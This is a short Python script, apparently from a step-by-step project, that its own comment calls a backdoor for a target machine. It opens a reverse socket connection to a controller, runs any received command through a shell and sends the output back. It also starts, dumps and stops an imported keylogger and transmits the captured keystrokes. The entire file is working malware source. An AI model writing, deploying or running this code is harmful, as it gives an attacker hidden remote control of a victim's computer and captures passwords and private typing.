#backdoor that runs on target machine
import socket
import json
import os
import sys
import subprocess
import threading
import time
from keylogger import KeyLogger

ip = '127.0.0.1'
port = 4141

client = socket.socket()
client.connect((ip, port))
print("connected")

def execute_shell():
    while True:
        command = client.recv(1024).decode()

        print(f"command received: {command}")

        if command == 'quit':
            try: keylog.self_destruct()
            except: pass
            break
        elif command[:2] == 'cd':
            try:
                os.chdir(command[3:])

            except:#there wasn't anything after "cd"
                pass
                
            finally:
                client.send(os.getcwd().encode())

        elif command[:12] == 'keylog_start':
            keylog = KeyLogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            client.send(b'keylog started')

        elif command[:11] == 'keylog_dump':
            try:
                keys = keylog.readkeys()
                print(keys)
                client.send(keys.encode())
            except:
                client.send(b'error')

        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            client.send(b'keylog stopeed')
            
        #TODO add elif('s) for keylogger (step 6)
        else:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            client.send(op.stdout.read() + op.stderr.read())
        
        

execute_shell()




